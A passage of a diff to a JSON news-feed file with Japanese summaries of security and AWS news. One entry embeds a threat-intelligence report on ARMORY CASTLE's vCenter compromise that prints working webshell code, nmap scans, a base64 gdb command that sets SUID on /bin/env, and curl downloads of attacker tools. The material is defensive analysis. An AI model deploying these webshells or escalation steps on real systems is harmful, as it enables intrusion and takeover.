+            "detail": "SCRIPT_FILENAMEやPHP_ADMIN_VALUEを指定しワーカー権限でPHPコードを実行"
+          },
+          {
+            "stage": "initial-access",
+            "detail": "異なるシリアライザーのセッション保存先を共有し攻撃者入力を保存する"
+          },
+          {
+            "stage": "impact",
+            "detail": "セッションデータのデシリアライズでコード実行やセッション破損を起こす"
+          }
+        ],
+        "personal": [
+          "PHP 8.2〜8.5を使う環境を8.2.36、8.3.37、8.4.28、8.5.13以降へ更新する。",
+          "PHP 8.5ではzend.exception_ignore_args=1またはfatal_error_backtraces=0を設定して再起動する。",
+          "session.upload_progress.enabled=0をリクエスト入力処理より前の管理者設定に入れる。",
+          "外部URLのHTTPS・FTPSを小文字へ正規化し、リダイレクト先を検証してから取得する。"
+        ],
+        "organization": [
+          {
+            "kind": "tech",
+            "action": "修正版PHPへ更新し、セッション・FPM・ストリームラッパーの脆弱な処理を止める。"
+          },
+          {
+            "kind": "tech",
+            "action": "FPM接続の再利用を無効化し、CVE-2026-129289の読み残しからの偽FastCGI処理を止める。"
+          },
+          {
+            "kind": "tech",
+            "action": "すべての共有セッション保存先でシリアライザーを統一し、session.upload_progress.enabledを無効化する。"
+          },
+          {
+            "kind": "tech",
+            "action": "catch_workers_outputを不要なら無効化し、CVE-2026-129291のFPMマスター到達条件を外す。"
+          },
+          {
+            "kind": "ops",
+            "action": "PHPマスターと全ワーカーを再起動し、起動時診断、ワーカークラッシュ、外向きURLの大文字Sをログ確認する。"
+          }
+        ],
+        "relevance": [
+          "PHP 8.2〜8.5を本番で使っている企業",
+          "PHP-FPMの接続再利用や公式Dockerイメージを使う環境",
+          "セッション、SOAP、Phar、外部HTTP・FTP取得を使うアプリ"
+        ],
+        "unknowns": [
+          "記事では今回の脆弱性を利用した実被害は示されていない",
+          "個別の攻撃者、侵入組織、漏洩件数は公表されていない",
+          "17件すべての攻撃連鎖や実環境での悪用可否は確定していない"
+        ],
+        "whatsNew": null
+      }
+    },
+    {
+      "source": "hatena",
+      "sourceLabel": "はてなブックマーク",
+      "title": "認証なしでリモートコード実行の恐れ、Javaに脆弱性「Java4Shell」　JiraやJenkinsで攻撃実証の報告も",
+      "url": "https://www.itmedia.co.jp/enterprise/articles/2611/19/news055.html",
+      "publishedAt": "2026-11-19T07:23:06.000Z",
+      "tags": [
+        "テクノロジー",
+        "あとで読む"
+      ],
+      "snippet": "認証なしでリモートコード実行の恐れ、Javaに脆弱性「Java4Shell」 JiraやJenkinsで攻撃実証の報告も：セキュリティニュースアラート 米CISAは、Javaの実行環境に見つかった脆弱性「Java4Shell」の修正を直ちに適用するよう組織に求めた。IPAも注意喚起を公開している。影響を受けるのはどのような環境か。修正をすぐに...",
+      "metrics": {
+        "hatena": 6
+      },
+      "sourceWeight": 3,
+      "id": "ee9cb372f9c2c3ae",
+      "lang": "ja",
+      "foundIn": [
+        "hatena"
+      ],
+      "preScore": 0.38125000000000003,
+      "popularityPercentile": 0.1875,
+      "matchedTopics": [
+        "セキュアな開発"
+      ],
+      "buzz": true,
+      "score": 86,
+      "titleJa": null,
+      "oneLiner": "Java4Shellは認証不要の遠隔コード実行につながる可能性があり、CISAとIPAが緊急対応を促した。",
+      "takeaways": [
+        "Javaの実行環境に深刻な欠陥が見つかった。",
+        "ログインなしで外部から不正な処理を実行される恐れがある。",
+        "CISAとIPAは修正を直ちに適用するよう求めている。"
+      ],
+      "keywords": [
+        "Java4Shell",
+        "CVE-2026-114938",
+        "Java",
+        "CISA",
+        "IPA",
+        "リモートコード実行"
+      ],
+      "category": "調査・考察",
+      "lane": "know",
+      "readingMinutes": 4,
+      "payoff": "aware",
+      "durability": "durable",
+      "imageUrl": "https://image.itmedia.co.jp/enterprise/articles/2611/19/cover_news055.jpg",
+      "rank": 1,
+      "deep": {
+        "summary": "この記事は、Javaの実行環境に「Java4Shell」と呼ばれる脆弱性が見つかり、認証なしでリモートコード実行に至る恐れがあると報じている。米CISAは組織に対して修正を直ちに適用するよう求め、IPAも注意喚起を公開した。JiraやJenkinsを対象にした攻撃実証の報告もあるため、これらを運用する組織ではJavaの利用状況と公開範囲の確認が必要になる。本文抜粋だけでは、影響するJavaのバージョン、必要な設定条件、修正版の具体的な番号までは判明しない。",
+        "prerequisites": [
+          {
+            "term": "Java4Shell",
+            "stumblingPoint": "記事は「Java4Shell」と呼ぶが、名称だけではJavaのどの層の脆弱性か読み取れない。",
+            "explanation": "Java4Shellは、記事がJavaの実行環境に見つかった脆弱性へ付けている呼称である。ここで問題になるのはJavaで書いたアプリケーションのソースコードだけではなく、そのアプリケーションを動かす実行環境である。影響バージョンや条件が未確認のままでは、単にJavaを使っているという理由だけで対象範囲を判断できない。"
+          },
+          {
+            "term": "Javaの実行環境",
+            "stumblingPoint": "記事は「Javaの実行環境に見つかった脆弱性」と書くが、アプリケーションとの境界が分からないと棚卸し対象を決められない。",
+            "explanation": "Javaの実行環境は、Javaアプリケーションを動かすJREやJDKなどのランタイム部分を指す。アプリケーションの依存ライブラリだけでなく、サーバやコンテナ内のJavaランタイムも確認対象になる。どの製品がJavaを内部利用しているかを把握しないと、JiraやJenkinsのような製品単位の影響確認で漏れが生じる。"
+          },
+          {
+            "term": "リモートコード実行",
+            "stumblingPoint": "「認証なしでリモートコード実行」とあるが、攻撃者が何を省略してサーバ上で処理できるのかが分かりにくい。",
+            "explanation": "リモートコード実行は、攻撃者が対象サーバへコードを送り、そのサーバの権限で実行させる状態である。認証なしという条件が成立すると、ログイン資格情報を持たない外部者でも攻撃経路に入れる可能性がある。実際に成立する入力条件や権限範囲は、本文抜粋だけでは分からない。"
+          },
+          {
+            "term": "CISA",
+            "stumblingPoint": "記事は「米CISAが修正を直ちに適用するよう求めた」と書くが、単なる製品ベンダーの告知との違いが読み取りにくい。",
+            "explanation": "CISAは米国政府のサイバーセキュリティ機関で、組織向けに脆弱性対応を促す立場にある。この記事では、CISAの要請がJava4Shellへの緊急対応の根拠として示されている。具体的な適用期限や対象バージョンは、CISAの注意喚起本文を開いて確認する必要がある。"
+          },
+          {
+            "term": "IPA",
+            "stumblingPoint": "「IPAも注意喚起を公開」とあるが、CISAの情報を国内向けにどう使い分けるかが本文抜粋では分からない。",
+            "explanation": "IPAは日本国内の利用者や組織に向けて脆弱性情報と対策を案内する機関である。日本の運用担当者は、IPAの注意喚起で影響製品、対策方法、国内向けの補足情報を照合できる。記事の抜粋には注意喚起のURLや内容がないため、実際の対応条件は原資料で確認する必要がある。"
+          },
+          {
+            "term": "Jira",
+            "stumblingPoint": "記事は「JiraやJenkinsで攻撃実証」と書くが、製品自体の脆弱性なのかJava経由なのか判別できない。",
+            "explanation": "JiraはJavaで動作する構成を取り得る業務アプリケーションで、Javaランタイムの脆弱性が製品の到達可能な機能へ影響する可能性がある。ここでの攻撃実証は、Jira固有の脆弱性が確定したという意味とは限らない。影響する製品バージョン、Javaの組み合わせ、公開条件は本文抜粋だけでは不明である。"
+          },
+          {
+            "term": "Jenkins",
+            "stumblingPoint": "記事は「JiraやJenkinsで攻撃実証」と書くが、Jenkinsのどの公開面が使われたか分からない。",
+            "explanation": "Jenkinsはジョブ実行や自動化を担うJavaベースのサーバで、侵害時の影響が大きくなり得る製品である。記事が示しているのは攻撃実証の報告があることまでで、対象バージョンや攻撃リクエストの条件は抜粋されていない。Jenkinsを運用している場合は、Javaのバージョンだけでなく外部公開状態も原資料の条件と照合する必要がある。"
+          }
+        ],
+        "visual": null,
+        "figures": [],
+        "code": null,
+        "relatedLinks": [],
+        "readingMinutes": 3,
+        "lane": "know",
+        "impact": [
+          "Javaの実行環境を運用する人",
+          "Jiraを運用する人",
+          "Jenkinsを運用する人",
+          "脆弱性対応の責任者である人"
+        ],
+        "timeline": [],
+        "checkNow": [
+          "CISA/IPAの注意喚起を開き、影響バージョンを照合する",
+          "Jira/JenkinsとJavaの稼働環境・外部公開先を列挙する"
+        ],
+        "unknowns": [
+          "影響するJavaのバージョンは本文抜粋では不明",
+          "攻撃実証の条件と対象構成は本文抜粋では不明",
+          "修正版の具体的な番号は本文抜粋では不明"
+        ]
+      }
+    },
+    {
+      "source": "rss",
+      "sourceLabel": "Google Cloud Blog",
+      "title": "ARMORY CASTLE Exploits vSphere",
+      "url": "https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere/",
+      "publishedAt": "2026-11-19T14:00:00.000Z",
+      "tags": [
+        "Threat Intelligence"
+      ],
+      "snippet": "Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram Introduction On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in Be…",
+      "body": "Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram \n\n \n Introduction   \n\n On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in BeyondTrust Remote Support, which was patched in BT26-05 . We also described some of the threat actor’s post-exploitation operations. In this blog we describe additional post-compromise activity involving the exploitation of a vulnerability in VMware vCenter and the deployment of additional malware families.  \n\n On Nov. 19, 2026, VMware disclosed CVE-2026-123890, which impacts VMware vCenter Server deployments. vSphere consists of both ESXi (the hypervisor) and vCenter Server. The vCenter server is a centralized platform deployed as a Photon Linux virtual appliance and is used to configure, control, and monitor ESXi host environments. CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC). Successful exploitation results in a remote authentication bypass which creates an authenticated session established as administrator@vsphere.local . Using the authenticated administrator session, the attacker can execute arbitrary commands and acquire files, including the data.mdb database, by leveraging the vCenter Server Directory Service ( vmdird ) RPC interface vmdirdbcp . We strongly recommend that affected organizations immediately apply the security patches provided by Broadcom to remediate the vulnerability.   \n\n ARMORY CASTLE exploited this vulnerability in early September 2026 using BONESAW, according to forensic evidence. BONESAW is a utility primarily built to facilitate remote exploitation written in Golang , which utilizes CVE-2026-123890 to exfiltrate the arbitrary Lightning Memory-Mapped Database (LMDB), hijack the SAML Security Token Service (STS), and create a Single Sign On (SSO) Administrator account. \n\n ARMORY CASTLE’s use of BONESAW represents significant new insight into this threat actor’s post-exploitation tactics. In this campaign, ARMORY CASTLE exploited two zero-days, and deployed three sets of malware specifically tailored for operating on targeted devices, indicating deep platform expertise and substantial resource backing. We are publishing this analysis, along with mitigation and hardening guidance, to support defenders in detecting this threat.  \n\n Threat Detail  \n\n Moving laterally from the Remote SupportRemote Support device, ARMORY CASTLE established a foothold on an internal Linux appliance, escalated privileges to root, and staged a suite of malware to support expanding access, persistence, and targeting of vCenter. ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct reconnaissance, credential theft, and data theft. \n\n \n\n \n \n \n \n\n \n\n \n \n \n \n \n \n \n Figure 1: ARMORY CASTLE lateral movement and vCenter compromise sequence of events\n \n \n \n\n \n \n\n \n\n \n\n Move Laterally \n\n Following the establishment of persistence and the deployment of lateral movement capabilities on the Remote Support appliance, Mandiant observed ARMORY CASTLE conducting internal reconnaissance. This reconnaissance was heavily focused on VMware systems, based on the specific ports ARMORY CASTLE scanned and the URIs the group visited such as /sdk and /ui . The group leveraged nmap to scan the internal environment for systems running open ports specific to VMware, namely ports 9080, 5480, and 2012. Notably, port 2012 is used as the control interface RPC for vCenter Single Sign-On (SSO) and is an integral part of ARMORY CASTLE’s remote exploitation of CVE-2026-123890 through BONESAW. \n\n /usr/sbin/nmap -sS -p 443,2012,389 --open <REDACTED>.0/24\n/usr/sbin/nmap -sS -p 443,2012,5480 --open <REDACTED>.0/24\n/usr/sbin/nmap -sS -p 443,9080 --open <REDACTED>.0/24\n/usr/sbin/nmap -sS -p 9080,2012 --open <REDACTED>.0/24\n/usr/sbin/nmap -sS -p 443,2012,389,445,3389,22,21 --open <REDACTED>.0/24 \n\n Figure 2: ARMORY CASTLE nmap port scanning \n\n ARMORY CASTLE moved laterally to internal Linux appliances within the environment that lacked endpoint detection and response (EDR) tooling. ARMORY CASTLE deployed five newly identified malware families and utilities: the SLIMSAVAGE and CAGEMATCH webshells, the BEARBONES backdoor, the BONESAW remote exploitation utility, and the SAWSNAKE SAML utility. ARMORY CASTLE also deployed the LAZYBONES backdoor, which Mandiant and GTIG previously observed in a separate ARMORY CASTLE intrusion. \n\n Establish a Foothold \n\n To establish a foothold on the first Linux appliance, the actor dropped a webshell ActiveSer.jsp , tracked by Mandiant as SLIMSAVAGE. SLIMSAVAGE functions as an upgraded command execution webshell that utilizes the authentication secret pwd=123 . \n\n if(\"123\".equals(request.getParameter(\"pwd\"))){\n try{\n ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\",\"-c\",request.getParameter(\"i\"));\n Process p = pb.start();\n InputStream a = p.getInputStream(), b = p.getErrorStream();\n int c; byte[] d = new byte[2048];\n out.print(\"<pre>\");\n while((c=a.read(d))!=-1){out.print(new String(d,0,c));}\n while((c=b.read(d))!=-1){out.print(new String(d,0,c));}\n out.print(\"</pre>\");\n out.print(\"\\nEXIT:\"+p.waitFor());\n }catch(Exception e){out.print(\"ERR:\"+e);}\n} \n\n Figure 3: SLIMSAVAGE Webshell \n\n By leveraging ProcessBuilder(\"/bin/sh\", \"-c\", ...) , the SLIMSAVAGE webshell executed commands inside a command line interpreter, enabled shell pipelines, redirects, creation of environment variables, and chained execution. The webshell reads from both standard output ( getInputStream() ) and standard error ( getErrorStream() ), ensuring full diagnostic visibility. It also calls Process.waitFor() and appends the final process return code ( \\nEXIT:<code> ). \n\n Roughly 4 hours later, ARMORY CASTLE deployed an additional webshell to the Linux appliance, u.jsp , tracked as CAGEMATCH. While SLIMSAVAGE provided the group with a robust capability to execute commands on the appliance, the group was limited in their ability to transfer data. To solve this challenge, CAGEMATCH acts as a dedicated payload staging webshell. The webshell checks for a multipart/form-data request header, parses the boundary delimiter, and extracts raw file bytes along with the original filename. \n\n File f = new File(\"/tmp\");\nf.mkdirs();\nFile fout = new File(f, fname);\ntry(FileOutputStream fos = new FileOutputStream(fout)){\n fos.write(fd);\n}\nm = fout.getAbsolutePath(); \n\n Figure 4: CAGEMATCH File Staging Logic \n\n CAGEMATCH creates the /tmp directory if necessary, saves the uploaded payload directly to /tmp/<filename> , and echoes the absolute target path back to the client. When accessed without an upload payload, it returns a minimal HTML upload form. This provides the attacker with a streamlined post-exploitation workflow: using CAGEMATCH to upload binary payloads, scripts, or tools from the Remote Support appliance directly into /tmp , and subsequently invoke SLIMSAVAGE to adjust execution permissions and execute the staged tools. \n\n Escalate Privileges \n\n To escalate privileges to root on the Linux appliance, ARMORY CASTLE repeated the same escalation technique used on the Remote Support appliance through the enablement of Set User ID (SUID) permissions on the binary /bin/env . ARMORY CASTLE performed this permission modification using the GNU Debugger, gdb. By enabling SUID permissions on the binary /bin/env , any user would be allowed to execute commands as root. \n\n /bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file\n\n/usr/bin/gdb -pid 113757 --command=/tmp/gdb_file \n\n Figure 5: ARMORY CASTLE gdb Privilege Escalation \n\n Move Laterally \n\n After successfully escalating privileges to root, ARMORY CASTLE began staging additional tooling on the Linux appliance to enable lateral movement within the environment. ARMORY CASTLE used curl to download the RAR utility from the Remote Support appliance. \n\n  \n\n curl -o /tmp/rar -k https://<REDACTED>/content/r.js \n\n Figure 6: ARMORY CASTLE downloads staged RAR utility \n\n ARMORY CASTLE then utilized curl to download a rar archive 123.rar which was subsequently extracted using their downloaded RAR binary. \n\n curl -o /tmp/123.rar -k https://<REDACTED>/content/r.js\n\n./rar x -p<REDACTED> 123.rar \n\n Figure 7: ARMORY CASTLE extracts BONESAW \n\n Tracked as BONESAW, /tmp/123 is a remote exploitation utility written in Golang that leverages CVE-2026-123890 in vCenter to enable remote arbitrary LMDB exfiltration, SAML STS hijacking, and SSO administrator account creation. Mandiant observed ARMORY CASTLE leveraging this utility to target an internal vCenter server, successfully creating an SSO admin account, exfiltrating and parsing the LMDB which enabled lateral movement to the server.  \n\n BONESAW achieves full system compromise against vCenter Server 7.x and 8.x appliances through the exploitation of CVE-2026-123890. This vulnerability exploits a cryptographic logic and authorization flaw in VMware's rpc_srp_verifier service over port 2012, exposing a shared session key that can be used to create authenticated sessions as administrator@vsphere.local . BONESAW also provides the ability to stream the raw underlying LMDB file for offline parsing, extract the VMware Security Token Service (STS) SAML private RSA signing key, create a backdoor machine account via vmdir , forge administrative SAML 2.0 assertion tokens, and assign Global Administrator privileges on the vCenter root folder via the vSphere SOAP API. \n\n While CVE-2026-123890 shares some overlap with CVE-2026-59309 , primarily the obtaining of the shared session key \"K\" without knowing the password , there are multiple key differences between them. CVE-2026-59309 is a flaw in the vCenter Server vmdir daemon that allows a remote, unauthenticated attacker with network access to TCP ports 389 or 636 to send crafted LDAP packets with malformed authorization tokens, bypassing authentication to forge administrative sessions and create rogue Single Sign-On (SSO) accounts in the vSphere directory. Whereas CVE-2026-123890 is a flaw in the vmdir DCE/RPC interface that enables unauthenticated Secure Remote Password session key disclosure by exploiting predictable UUIDv1 timestamp generation in the SRP authentication interface, enabling the compromise of the SRP session key without knowing any passwords. \n\n Mandiant has evidence that ARMORY CASTLE had knowledge of CVE-2026-123890 prior to the disclosure of CVE-2026-59309 on July 29, 2026. Logs indicate that BONESAW was executed in early September 2026 against a vCenter server already patched against CVE-2026-59309, and the recovered Go binary contains a build timestamp of 2026-07-13T09:21:24Z (16 days before CVE-2026-59309 was disclosed), although Go build metadata can be modified prior to compilation. \n\n ARMORY CASTLE named BONESAW vcenter-db-teamcheck-go and compiled it in a Windows development environment based on Golang build artifacts: E:/CodeFiles/VulnScan/Vcenter/go_teamcheck/ . BONESAW supports multiple command-line arguments, with primary functionality centered on the csa subcommand to remotely create an SSO admin account. \n\n Subcommand csa (\"Create SSO admin with minimal parameters\"):\n • Loads embedded default configuration template and parses CLI flags:\n • -h: Target vCenter address or vim25 SOAP endpoint (required).\n • -u: Username for the new SSO admin account (required).\n • -p: Password for the new SSO admin account (required).\n • -lu: Existing vCenter local admin UPN used for the vmdird bridge authentication (default: administrator@vsphere[.]local).\n • -d: Tenant/domain name for the created SSO account (default: vsphere[.]lo…",
+      "metrics": {},
+      "sourceWeight": 4,
+      "id": "ae6cb35b96d83ade",
+      "lang": "en",
+      "foundIn": [
+        "rss"
+      ],
+      "preScore": 0.6216666666666667,
+      "popularityPercentile": 0.5,
+      "matchedTopics": [],
+      "buzz": false,
+      "score": 75,
+      "titleJa": "ARMORY CASTLEによるvSphere侵害の追加分析",
+      "oneLiner": "Google Threat IntelligenceはARMORY CASTLEによるVMware vCenterの悪用と追加マルウェア展開を報告した。",
+      "takeaways": [
+        "ARMORY CASTLEの侵害活動に新たな手口が確認された。",
+        "攻撃者はVMware vCenterの欠陥を悪用していた。",
+        "侵入後には追加の悪意あるプログラムが展開された。"
+      ],
+      "keywords": [
+        "ARMORY CASTLE",
+        "VMware vCenter",
+        "Google Threat Intelligence",
+        "Mandiant",
+        "GTIG",
+        "UNC5221"
+      ],
+      "category": "調査・考察",
+      "lane": "know",
+      "readingMinutes": 10,
+      "payoff": "aware",
+      "durability": "durable",
+      "imageUrl": "https://storage.googleapis.com/gweb-cloudblog-publish/images/03_ThreatIntelligenceWebsiteBannerIdeas_BA.max-2600x2600.png",
+      "rank": 2,
+      "deep": {
+        "summary": "ARMORY CASTLE（旧UNC5221）は、BeyondTrust Remote Supportへの侵入を起点に、内部Linuxアプライアンスへ横展開し、vCenter Serverを狙った一連の侵害を行った。2026年9月初旬、攻撃者はCVE-2026-123890を悪用するBONESAWで、vCenter Server 7.x/8.xからLMDBを窃取し、SAML STSを乗っ取り、SSO管理者アカウントを作成した。CVE-2026-123890はvCenterのDCE/RPC経由でSRP-6aセッション鍵を漏えいさせ、パスワードなしでadministrator@vsphere.localの認証済みセッションを作れる脆弱性である。侵害後はSLIMSAVAGEとCAGEMATCHでコマンド実行・ファイル配置を行い、gdbで/bin/envにSUIDを付けてroot権限へ昇格した。記事は、vCenterのパッチ適用、2012番ポートへの到達経路、未知のSSO管理者や/tmp上の不審なツールを確認するよう求めている。",
+        "prerequisites": [
+          {
+            "term": "ARMORY CASTLE",
+            "stumblingPoint": "記事はARMORY CASTLEが二つのzero-dayを悪用したと書くが、従来のUNC5221との関係が読み取れない。",
+            "explanation": "ARMORY CASTLEは、記事で扱う攻撃者の現在の追跡名で、旧称はUNC5221である。この名前を同一グループとして理解しないと、過去のRemote Support侵害と今回のvCenter侵害が別事件に見える。記事では、同じ侵入活動の中で異なる製品を連鎖的に侵害したことが重要である。"
+          },
+          {
+            "term": "CVE-2026-123890",
+            "stumblingPoint": "記事はCVE-2026-123890で認証を迂回し、administrator@vsphere.localになると説明するが、何が漏れる脆弱性かが掴みにくい。",
+            "explanation": "CVE-2026-123890は、vCenterのDCE/RPC上にあるSRP-6a認証処理から共有セッション鍵を漏えいさせる脆弱性である。攻撃者はパスワードを知らなくても、その鍵を使って認証済み管理者セッションを作れる。結果として、単なる情報漏えいではなく、vCenter上で管理者として操作できる認証バイパスになる。"
+          },
+          {
+            "term": "vCenter Server",
+            "stumblingPoint": "記事はvSphereがESXiとvCenter Serverで構成されると書くが、攻撃対象がどの管理面かを区別しないと影響範囲を誤る。",
+            "explanation": "vCenter Serverは、Photon Linuxの仮想アプライアンスとして動作し、複数のESXiホストを集中管理する制御面である。今回の攻撃は個々のESXiホストではなく、vCenter Serverの認証・ディレクトリ・管理APIを狙っている。ここが侵害されると、管理対象環境全体への横展開や権限操作につながり得る。"
+          },
+          {
+            "term": "BONESAW",
+            "stumblingPoint": "記事はBONESAWがLMDB窃取やSAML STS乗っ取りを行うと書くが、単なる脆弱性スキャナとの違いが分からない。",
+            "explanation": "BONESAWは、CVE-2026-123890を遠隔から悪用するために作られたGolang製ユーティリティである。vCenterのLMDBを取得して解析し、STSの秘密鍵を扱い、SSO管理者アカウントや管理者トークンを作成する機能を持つ。つまり、侵入確認だけでなく、認証情報の取得と永続的な管理権限の確立までを自動化する道具である。"
+          },
+          {
+            "term": "SRP-6a",
+            "stumblingPoint": "記事はSRP-6aセッション鍵の開示を問題にするが、鍵が漏れると認証バイパスになる理由が省略されている。",
+            "explanation": "SRP-6aは、パスワードを直接送らずに共有秘密を確立する認証方式である。vCenterの実装では、その認証に使う共有セッション鍵が推測可能なUUIDv1時刻生成と結び付いていたと記事は説明する。鍵を再現・取得されると、攻撃者は正しいパスワードを提示せずに管理者セッションを成立させられる。"
+          },
+          {
+            "term": "DCE/RPC",
+            "stumblingPoint": "記事はvmdirdのDCE/RPCインターフェースを攻撃経路として挙げるが、LDAP経由の別脆弱性との違いが読み取りづらい。",
+            "explanation": "DCE/RPCは、vCenter内部サービスの処理を遠隔呼び出しするための通信方式である。今回のCVE-2026-123890は、vmdirdのDCE/RPC側にあるSRP認証処理を悪用し、主にTCP 2012を経路とする。一方、記事が比較するCVE-2026-59309はTCP 389または636のLDAP処理の欠陥であり、同じvCenterでも攻撃面が異なる。"
+          },
+          {
+            "term": "vmdird",
+            "stumblingPoint": "記事はvmdirdbcpでdata.mdbを取得できると書くが、vmdirdとLMDBの関係が分からない。",
+            "explanation": "vmdirdは、vCenter Single Sign-Onのディレクトリサービスで、アカウントや認証関連の情報を管理する。vmdirdbcpはそのサービスのRPCインターフェースで、記事では攻撃者がこれを通じてデータベースファイルを取得した。取得されたLMDBには、後続の管理者作成や横展開に使える情報が含まれ得るため、ファイル窃取が認証基盤の侵害に直結する。"
+          },
+          {
+            "term": "SAML STS",
+            "stumblingPoint": "記事はSAML STSの秘密RSA署名鍵を抽出すると書くが、なぜSSO管理者の偽造につながるかが省略されている。",
+            "explanation": "SAML STSは、認証済み利用者がvSphereへアクセスするためのSAMLトークンを発行するサービスである。STSの署名鍵を奪われると、攻撃者は正規のSTSが発行したように見える管理者向けSAMLアサーションを偽造できる。BONESAWはこの仕組みを、SSO管理者アカウント作成やGlobal Administrator権限付与と組み合わせている。"
+          }
+        ],
+        "visual": null,
+        "figures": [
+          {
+            "url": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_ARMORY_CASTLE_lateral_movement_an.max-1200x1200.png",
+            "alt": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_ARMORY_CASTLE_lateral_movement_an.max-1200x1200.png",
+            "caption": "Remote Supportから内部Linuxアプライアンスを経て、vCenterの探索・侵害・認証基盤窃取へ進む攻撃順序を示す。"
+          }
+        ],
+        "code": null,
+        "relatedLinks": [],
+        "readingMinutes": 8,
+        "lane": "know",
+        "impact": [
+          "VMware vCenter Server 7.x/8.xを運用する人",
+          "vCenterのTCP 2012へ到達可能な環境の管理者",
+          "EDR未導入の内部Linuxアプライアンスを管理する人",
+          "BeyondTrust Remote Supportを運用する人"
+        ],
+        "timeline": [
+          "2026-07-13 BONESAWのビルド時刻記録",
+          "2026-09-初旬 CVE-2026-123890を悪用",
+          "2026-11-19 CVE-2026-123890開示"
+        ],
+        "checkNow": [
+          "BroadcomのCVE-2026-123890修正パッチ適用状況を確認する",
+          "vCenterのSSO管理者一覧で未知のアカウントを確認する",
+          "Linuxの/tmpで123、123.rar、rarを調査する"
+        ],
+        "unknowns": [
+          "影響版と修正版の番号は本文記載なし",
+          "BONESAWの実際のビルド日時は未確定",
+          "記事抜粋ではcsaの全フラグが未掲載"
+        ]
+      }
+    },
+    {
+      "source": "rss",
+      "sourceLabel": "AWS ブログ（日本）",
+      "title": "AWS Weekly Roundup: AWS Nitro Sandboxes、AWS Emulator など (2026 年 11 月 16 日)",
+      "url": "https://aws.amazon.com/jp/blogs/news/aws-weekly-roundup-aws-nitro-sandboxes-aws-emulator-and-more-november-16-2026/",
+      "publishedAt": "2026-11-19T06:11:37.000Z",
+      "author": "Daniel Abib",
+      "authorDetail": {
+        "name": "Daniel Abib"
+      },
+      "tags": [
+        "Amazon Bedrock",
+        "Amazon CloudWatch",
+        "Amazon Cognito",
+        "Amazon DynamoDB",
+        "Amazon EC2",
+        "Amazon Elastic Container Service",
+        "Amazon Elastic Kubernetes Service",
+        "Amazon ElastiCache",
+        "Amazon OpenSearch Service",
+        "Announcements",
+        "AWS re:Invent",
+        "AWS Step Functions"
+      ],
+      "snippet": "同じメッセージの 2 回目の配信は、ハッピーパスを想定したデモよりもアプリケーションの詳細を明らかにすることが […]",
+      "body": "同じメッセージの 2 回目の配信は、ハッピーパスを想定したデモよりもアプリケーションの詳細を明らかにすることができます。私は、変更の規模がまだ小さいうちにこうしたケースをより簡単に調査できるようにするツールが好きです。2026 年 11 月 9 日週リリースされた AWS Emulator は、その作業の一部を独自のマシンで行えるようにするものです。開発者とコーディングエージェントは、試行するたびにクラウドリソースをプロビジョニングしなくても、AWS API インタラクションをテストし、結果を調べ、再試行できます。\n \n 11 月 9 日週、Emulator のリリースに関する記事を書きましたが、今回はこのトピックに着目したいと思います。また、共有インフラストラクチャ上でワークロードを分離する、対象範囲が絞り込まれたバックエンドアクセス権をエージェントに付与する、およびリージョン障害に備えて検索アプリケーションを準備するための新しい方法もあります。それでは、11 月 16 日週の AWS ニュースを詳しく見ていきましょう。\n \n \n \n AWS Emulator は、コードや開発ツールとともにローカル実行されます。画像: AWS 。 \n \n \n \n トップニュース \n 「 AWS Emulator を使用してローカルで AWS に対してアプリケーションをテストする 」では、AWS API インタラクション用に一般提供されるローカル環境が紹介されています。 AWS CLI または AWS SDK のエンドポイントとして Emulator の HTTPS エンドポイントを指定すると、アプリケーションは通常の SDK コールをそのまま使用します。ウォークスルーは、コーディングエージェントが Amazon DynamoDB テーブルを作成し、項目を書き込んで、その項目を読み出す仕組みを説明しています。エミュレートされた操作に AWS アカウントは不要で、追加のサービス料金もかかりません。 使用開始ガイド では、Linux パッケージ、macOS および Windows 向けの Docker、エージェント支援のセットアップが解説されています。 ソースは GitHub で入手可能 です。\n \n 私が気に入っているのは、作業中のエージェントに具体的なフィードバックを提供できる点で、呼び出しの実行、結果の調査、コードの修正を行えます。 コーディングエージェントへのフィードバック に関する Matt Wood の考察では、こうしたループが重要である理由を検証しています。カバレッジにはばらつきがあり、未実装の呼び出しは HTTP 501 を返すため、操作に関する公開済みの 忠実度結果 を確認してください。Emulator は、 IAM とリソースポリシーの適用、またはクロスアカウントとクロスリージョンの動作を再現しないため、本番移行前にアプリケーションの全体とセキュリティ設定を AWS でテストしてください。\n \n AWS Nitro Sandboxes は、ポッド、タスク、VM のハードウェア分離を実現します 。 Amazon EC2 インスタンスを共有しながら、 Amazon EKS ポッドまたは Amazon ECS タスクに独自の VM 境界を適用できます。これは、テナントワークロード、ビルドジョブ、および生成されたコードを実行するエージェントに役立ちます。分離モードはワークロードを隣接するワークロードから切り離し、機密モードはノードオペレーターからの保護と暗号学的な構成証明を追加します。両モードとそれらの統合については、 コンピューティングブログのディープダイブ で詳しく説明されています。サポート対象のインスタンスで Nitro Sandboxes の追加料金は発生しませんが、EC2 および該当する EKS Auto Mode または ECS マネージドインスタンスの料金は引き続き適用されます。\n \n 11 月 9 日週のリリース \n 11 月 9 日週のリリースと更新のうち、私が注目したものをいくつかご紹介します。\n \n Amazon Cognito が OAuth 2.0 トークン交換をサポート – Amazon Cognito で、ユーザーのトークンをダウンストリームサービスを対象とするトークンと交換できるようになりました。派生トークンにはより限定的な許可と単一のオーディエンスを設定でき、リフレッシュトークンは発行されません。アクタートークンを提供すると、 act 